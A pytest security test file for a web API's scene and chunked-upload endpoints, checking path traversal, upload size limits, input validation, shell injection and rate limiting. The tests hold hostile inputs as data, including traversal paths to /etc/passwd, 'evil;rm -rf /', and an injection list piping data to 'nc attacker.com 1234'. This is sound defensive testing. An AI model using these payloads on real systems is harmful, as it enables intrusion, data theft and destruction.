"""Security tests: path traversal, upload limits, input validation, rate limiting."""

from typing import Any

import pytest
from httpx import AsyncClient


# --- Path traversal tests ---


@pytest.mark.asyncio
async def test_path_traversal_dotdot_returns_422(client: AsyncClient) -> None:
    """Scene ID with '..' is rejected."""
    response = await client.get("/api/scene/../etc/passwd/config")
    assert response.status_code in (403, 404, 422)


@pytest.mark.asyncio
async def test_path_traversal_scene_id_upload(client: AsyncClient) -> None:
    """Upload with path traversal scene_id is rejected."""
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": "../evil",
            "chunk_index": 0,
            "total_chunks": 1,
        },
        files={"file": ("chunk", b"test data")},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_path_traversal_backslash(client: AsyncClient) -> None:
    """Scene ID with backslash is rejected."""
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": "..\\evil",
            "chunk_index": 0,
            "total_chunks": 1,
        },
        files={"file": ("chunk", b"test data")},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_path_traversal_slash(client: AsyncClient) -> None:
    """Scene ID with forward slash is rejected."""
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": "foo/bar",
            "chunk_index": 0,
            "total_chunks": 1,
        },
        files={"file": ("chunk", b"test data")},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_path_traversal_null_byte(client: AsyncClient) -> None:
    """Scene ID with null byte is rejected."""
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": "evil\x00scene",
            "chunk_index": 0,
            "total_chunks": 1,
        },
        files={"file": ("chunk", b"test data")},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_path_traversal_pipeline_status(client: AsyncClient) -> None:
    """Pipeline status with path traversal scene_id is rejected."""
    response = await client.get("/api/pipeline/status/../../etc")
    assert response.status_code in (403, 404, 422)


@pytest.mark.asyncio
async def test_path_traversal_pipeline_logs(client: AsyncClient) -> None:
    """Pipeline logs with path traversal scene_id is rejected."""
    response = await client.get("/api/pipeline/logs/../../../etc/0")
    assert response.status_code in (403, 404, 422)


@pytest.mark.asyncio
async def test_path_traversal_scenes_config(client: AsyncClient) -> None:
    """Scenes config with path traversal scene_id is rejected."""
    response = await client.get("/api/scene/..%2F..%2Fetc/config")
    assert response.status_code in (403, 404, 422)


@pytest.mark.asyncio
async def test_path_traversal_cameras(client: AsyncClient) -> None:
    """Cameras with path traversal scene_id is rejected."""
    response = await client.get("/api/scene/../../../etc/cameras")
    assert response.status_code in (403, 404, 422)


# --- Upload size limit tests ---


@pytest.mark.asyncio
async def test_oversized_chunk_returns_413(
    client: AsyncClient, sample_scene: dict[str, Any],
) -> None:
    """Upload chunk exceeding max_chunk_size returns 413."""
    await client.post("/api/scenes", json=sample_scene)

    # Create a chunk larger than 10MB
    oversized_data = b"x" * (10 * 1024 * 1024 + 1)
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": sample_scene["id"],
            "chunk_index": 0,
            "total_chunks": 1,
        },
        files={"file": ("chunk", oversized_data)},
    )
    assert response.status_code == 413


# --- Input validation tests ---


@pytest.mark.asyncio
async def test_invalid_scene_id_special_chars(client: AsyncClient) -> None:
    """Scene ID with special characters is rejected with 422."""
    response = await client.post(
        "/api/scenes",
        json={"id": "evil;rm -rf /", "name": "Evil Scene"},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_invalid_scene_id_spaces(client: AsyncClient) -> None:
    """Scene ID with spaces is rejected with 422."""
    response = await client.post(
        "/api/scenes",
        json={"id": "has spaces", "name": "Space Scene"},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_invalid_scene_id_too_long(client: AsyncClient) -> None:
    """Scene ID exceeding 64 chars is rejected with 422."""
    long_id = "a" * 65
    response = await client.post(
        "/api/scenes",
        json={"id": long_id, "name": "Long ID Scene"},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_invalid_scene_id_empty(client: AsyncClient) -> None:
    """Empty scene ID is rejected with 422."""
    response = await client.post(
        "/api/scenes",
        json={"id": "", "name": "Empty ID"},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_valid_scene_id_accepted(
    client: AsyncClient, sample_scene: dict[str, Any],
) -> None:
    """Valid scene ID (alphanumeric + hyphens + underscores) is accepted."""
    response = await client.post("/api/scenes", json=sample_scene)
    assert response.status_code == 201


@pytest.mark.asyncio
async def test_shell_injection_scene_id(client: AsyncClient) -> None:
    """Shell injection characters in scene_id are rejected."""
    injection_payloads = [
        "$(whoami)",
        "`id`",
        "test; ls",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "test\ncat /etc/passwd",
    ]
    for payload in injection_payloads:
        response = await client.post(
            "/api/scenes",
            json={"id": payload, "name": "Injection Test"},
        )
        assert response.status_code == 422, f"Payload not rejected: {payload}"


@pytest.mark.asyncio
async def test_invalid_chunk_index_negative(
    client: AsyncClient, sample_scene: dict[str, Any],
) -> None:
    """Negative chunk_index is rejected."""
    await client.post("/api/scenes", json=sample_scene)
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": sample_scene["id"],
            "chunk_index": -1,
            "total_chunks": 1,
        },
        files={"file": ("chunk", b"data")},
    )
    assert response.status_code == 400


@pytest.mark.asyncio
async def test_invalid_total_chunks_zero(
    client: AsyncClient, sample_scene: dict[str, Any],
) -> None:
    """total_chunks of 0 is rejected."""
    await client.post("/api/scenes", json=sample_scene)
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": sample_scene["id"],
            "chunk_index": 0,
            "total_chunks": 0,
        },
        files={"file": ("chunk", b"data")},
    )
    assert response.status_code == 400


@pytest.mark.asyncio
async def test_invalid_total_chunks_too_large(
    client: AsyncClient, sample_scene: dict[str, Any],
) -> None:
    """total_chunks > 10000 is rejected."""
    await client.post("/api/scenes", json=sample_scene)
    response = await client.post(
        "/api/upload/chunk",
        data={
            "scene_id": sample_scene["id"],
            "chunk_index": 0,
            "total_chunks": 10001,
        },
        files={"file": ("chunk", b"data")},
    )
    assert response.status_code == 400


@pytest.mark.asyncio
async def test_invalid_pipeline_step_number(client: AsyncClient) -> None:
    """Pipeline step number > 9 is rejected."""
    response = await client.get("/api/pipeline/logs/test-scene/99")
    # Should be rejected by validation (422) since scene_id is not in DB,
    # but step validation happens after scene_id validation
    assert response.status_code in (400, 404, 422)


# --- Sanitize path unit tests ---


def test_sanitize_path_rejects_traversal() -> None:
    """sanitize_path rejects path traversal."""
    from pathlib import Path

    from server.security import sanitize_path

    # This should raise HTTPException(403) for null bytes
    import pytest as _pytest

    from fastapi import HTTPException

    with _pytest.raises(HTTPException) as exc_info:
        sanitize_path(Path("/base"), "..")
    assert exc_info.value.status_code == 403


def test_sanitize_path_accepts_valid() -> None:
    """sanitize_path accepts a valid subdirectory name."""
    from pathlib import Path

    from server.security import sanitize_path

    result = sanitize_path(Path("test_scenes"), "my-scene_01")
    assert "my-scene_01" in str(result)


# --- Rate limiter unit tests ---


def test_rate_limiter_allows_within_limit() -> None:
    """Rate limiter allows requests within the limit."""
    from server.security import SlidingWindowRateLimiter

    limiter = SlidingWindowRateLimiter(max_requests=3, window_seconds=60.0)
    assert limiter.is_allowed("test-key") is True
    assert limiter.is_allowed("test-key") is True
    assert limiter.is_allowed("test-key") is True


def test_rate_limiter_blocks_over_limit() -> None:
    """Rate limiter blocks requests over the limit."""
    from server.security import SlidingWindowRateLimiter

    limiter = SlidingWindowRateLimiter(max_requests=2, window_seconds=60.0)
    assert limiter.is_allowed("test-key") is True
    assert limiter.is_allowed("test-key") is True
    assert limiter.is_allowed("test-key") is False


def test_rate_limiter_independent_keys() -> None:
    """Rate limiter tracks keys independently."""
    from server.security import SlidingWindowRateLimiter

    limiter = SlidingWindowRateLimiter(max_requests=1, window_seconds=60.0)
    assert limiter.is_allowed("key-a") is True
    assert limiter.is_allowed("key-b") is True
    assert limiter.is_allowed("key-a") is False
    assert limiter.is_allowed("key-b") is False
